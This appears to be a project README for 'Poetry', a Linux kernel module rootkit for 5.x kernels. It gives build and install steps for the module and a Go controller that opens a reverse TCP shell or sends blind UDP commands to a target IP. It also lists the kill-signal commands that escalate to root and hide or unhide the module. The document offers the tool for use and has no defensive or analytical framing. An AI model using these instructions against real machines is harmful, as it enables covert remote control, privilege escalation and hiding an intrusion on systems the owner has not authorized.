![nil is goated](https://img.shields.io/badge/nil-goated-green)
# Poetry
This is a Linux kernel module rootkit made for >=5.X. It features privilege escalation, module hiding, and RCE/reverse shell capabilities. 

## Server Setup
### Building
#### If not on Linux:
Docker must be installed in order to compile the server binary. 
```sh
cd srv/
make # compile the go binary
ls out/ # compiled binary will be in the out/ directory
```
#### If on Linux:
You can utilize the method above if you have Docker installed, or you can use the method below if you have Golang installed. 
```sh
cd srv/

# compile the server binary
go build
```

The compiled binary will be called: `poetry`

### Usage
Copy the compiled binary to the host system. Run the following commands to interact with the target:
```sh
export IFACE=<ethernet_interface> # set interface env var
sudo -E ./poetry -t <target_ip> -s # -s attempts to spawn a reverse tcp shell
sudo -E ./poetry -t <target_ip> -c "<command>" # -c sends a single command through udp. no output
```

## Kernel Module
### Tested On:
- 5.4.0
- 5.13.0
### Building
```sh
# install needed packages
apt update
apt install build-essential \
            checkinstall \
            linux-headers-$(uname -r) \
            -y 

cd lkm/

# comment out the printk debug statements
sed -i 's/debug=1/debug=0/g' poet.c 

# compile the kernel module with the corresponding headers
make 
```
The compiled LKM will be: `poet.ko`
### Installing
```sh
# install the kernel module on the system
sudo insmod poet.ko 
```

#### Privilege Escalation + Module Hiding
```sh
kill -35 0 # escalate to root
kill -36 0 # hide poet module
kill -37 0 # unhide poet module
```

## References
TODO add refs